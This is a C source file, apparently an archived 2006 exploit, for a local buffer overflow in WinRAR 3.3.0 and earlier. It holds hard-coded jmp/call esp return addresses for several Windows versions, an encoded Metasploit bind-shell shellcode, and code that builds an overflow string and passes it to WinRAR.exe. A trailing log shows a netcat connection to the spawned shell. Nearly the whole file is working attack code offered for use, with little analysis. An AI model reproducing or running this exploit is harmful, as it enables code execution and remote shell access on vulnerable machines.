/*
	IHS public source code 
	WinRAR 3.3.0 and below local BOF exploit
	author : c0d3r , kaveh razavi <c0d3r@ihsteam.com>
	advisory : http://www.securityfocus.com/archive/1/420679
	tnx to alpha who reported the vulnerability
	workaround: use the lastest version
	special tnx to LorD and NT of IHS (my workmates and best friends)
	www.ihsteam.com
	www.ihsteam.net
	www.c0d3r.org
	showing some of iranian kids what real hacking is . 
	specially those who think changing a name server is hacking =)
*/

#include<stdio.h>
#include<string.h>
#include<winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#define NOP 0x90
#define size 930

char exploit[size];
char winxpsp1[]   = "\xCC\x59\xFB\x77"; // jmp esp in ntdll
char winxpsp2[]   = "\xED\x1E\x94\x7C"; // jmp esp (not tested)
char win2ksp4[]   = "\xBB\xED\x4F\x7C"; // call esp in kernel32.dll
char win2k3_sp0[] = "\xAB\x8B\xFB\x77"; // jmp esp in ntdll
char win2k3_sp1[] = "\x6A\xFA\xE8\x77"; // push esp - ret in kernel32
char *exec[3];
char point_esp[5];
unsigned int os;

// metasploit shellcode LPORT=4444
unsigned char shellcode[] =
"\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\x4f\x85"
"\x2f\x98\x83\xeb\xfc\xe2\xf4\xb3\x6d\x79\x98\x4f\x85\x7c\xcd\x19"
"\xd2\xa4\xf4\x6b\x9d\xa4\xdd\x73\x0e\x7b\x9d\x37\x84\xc5\x13\x05"
"\x9d\xa4\xc2\x6f\x84\xc4\x7b\x7d\xcc\xa4\xac\xc4\x84\xc1\xa9\xb0"
"\x79\x1e\x58\xe3\xbd\xcf\xec\x48\x44\xe0\x95\x4e\x42\xc4\x6a\x74"
"\xf9\x0b\x8c\x3a\x64\xa4\xc2\x6b\x84\xc4\xfe\xc4\x89\x64\x13\x15"
"\x99\x2e\x73\xc4\x81\xa4\x99\xa7\x6e\x2d\xa9\x8f\xda\x71\xc5\x14"
"\x47\x27\x98\x11\xef\x1f\xc1\x2b\x0e\x36\x13\x14\x89\xa4\xc3\x53"
"\x0e\x34\x13\x14\x8d\x7c\xf0\xc1\xcb\x21\x74\xb0\x53\xa6\x5f\xce"
"\x69\x2f\x99\x4f\x85\x78\xce\x1c\x0c\xca\x70\x68\x85\x2f\x98\xdf"
"\x84\x2f\x98\xf9\x9c\x37\x7f\xeb\x9c\x5f\x71\xaa\xcc\xa9\xd1\xeb"
"\x9f\x5f\x5f\xeb\x28\x01\x71\x96\x8c\xda\x35\x84\x68\xd3\xa3\x18"
"\xd6\x1d\xc7\x7c\xb7\x2f\xc3\xc2\xce\x0f\xc9\xb0\x52\xa6\x47\xc6"
"\x46\xa2\xed\x5b\xef\x28\xc1\x1e\xd6\xd0\xac\xc0\x7a\x7a\x9c\x16"
"\x0c\x2b\x16\xad\x77\x04\xbf\x1b\x7a\x18\x67\x1a\xb5\x1e\x58\x1f"
"\xd5\x7f\xc8\x0f\xd5\x6f\xc8\xb0\xd0\x03\x11\x88\xb4\xf4\xcb\x1c"
"\xed\x2d\x98\x5e\xd9\xa6\x78\x25\x95\x7f\xcf\xb0\xd0\x0b\xcb\x18"
"\x7a\x7a\xb0\x1c\xd1\x78\x67\x1a\xa5\xa6\x5f\x27\xc6\x62\xdc\x4f"
"\x0c\xcc\x1f\xb5\xb4\xef\x15\x33\xa1\x83\xf2\x5a\xdc\xdc\x33\xc8"
"\x7f\xac\x74\x1b\x43\x6b\xbc\x5f\xc1\x49\x5f\x0b\xa1\x13\x99\x4e"
"\x0c\x53\xbc\x07\x0c\x53\xbc\x03\x0c\x53\xbc\x1f\x08\x6b\xbc\x5f"
"\xd1\x7f\xc9\x1e\xd4\x6e\xc9\x06\xd4\x7e\xcb\x1e\x7a\x5a\x98\x27"
"\xf7\xd1\x2b\x59\x7a\x7a\x9c\xb0\x55\xa6\x7e\xb0\xf0\x2f\xf0\xe2"
"\x5c\x2a\x56\xb0\xd0\x2b\x11\x8c\xef\xd0\x67\x79\x7a\xfc\x67\x3a"
"\x85\x47\x68\xc5\x81\x70\x67\x1a\x81\x1e\x43\x1c\x7a\xff\x98";

usage(){
 
 printf("-------- usage : ihs_winrar.exe OS_VER\n");
 printf("-------- target 1 : windows xp service pack 1         : 0\n");
 printf("-------- target 2 : windows xp service pack 2         : 1\n");
 printf("-------- target 3 : windoes 2k advanced server sp 4   : 2\n");
 printf("-------- target 4 : windoes 2k3 server enterprise sp0 : 3\n");
 printf("-------- target 5 : windoes 2k3 server enterprise sp1 : 4\n");
 printf("-------- eg : ihs_winrar.exe 2\n\n");	
 exit(-1) ;
  }
int main(int argc , char **argv){
 
 printf("\n-------- WinRAR 330 and below Local BOF exploit by c0d3r\n");
 if(argc < 2)  
	usage();
  printf("\n");
 os = (unsigned short)atoi(argv[1]); 	 
  switch(os)
  {
   case 0:
    strcat(point_esp,winxpsp1);
    printf("[+] target : windows xp service pack 1\n");
	break;
   case 1:
    strcat(point_esp,winxpsp2); 
    printf("[+] target : windows xp service pack 2\n");
	break;
   case 2:
    strcat(point_esp,win2ksp4); 
    printf("[+] target : windows 2000 advanced server service pack 4\n");
	break;
   case 3:
	strcat(point_esp,win2k3_sp0);
	printf("[+] target : windows 2003 server enterprise service pack 0\n");
	break;
   case 4:
	strcat(point_esp,win2k3_sp1);
	printf("[+] target : windows 2003 server enterprise service pack 1\n");
	break;
   default:
    printf("\n[-] this target doesnt exist in the list\n\n");
   
    exit(-1);
  }  

printf("[+] exploit string is %d byte\n",size);
printf("[+] shellcode is %d byte\n", sizeof(shellcode)-1);
printf("[+] making exploit string :)\n");
memset(exploit,NOP,size);
memcpy(exploit+516,point_esp,sizeof(point_esp)-1);
memcpy(exploit+530,shellcode,sizeof(shellcode)-1);
exploit[size]=0x00;
printf("[+] exploit string ready\n");
printf("[+] preparing the executer\n");
exec[0]="WinRAR.exe";
exec[2]=NULL;
exec[1]=exploit;
printf("[+] executer ready\n");
printf("[+] exploiting ........\n");
execve(exec[0],exec,NULL);

return 0x0;
}
/*

I:\Program Files\WinRAR>ihs_winrar 2

-------- WinRAR 330 and below Local BOF exploit by c0d3r

[+] target : windows 2000 advanced server service pack 4
[+] exploit string is 930 byte
[+] shellcode is 399 byte
[+] making exploit string :)
[+] exploit string ready
[+] preparing the executer
[+] executer ready
[+] exploiting ........

I:\Program Files\WinRAR>nc -vv 127.0.0.1 4444
iran [127.0.0.1] 4444 (?) open
Microsoft Windows 2000 [Version 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.

I:\Program Files\WinRAR>

*/

// milw0rm.com [2006-01-04]
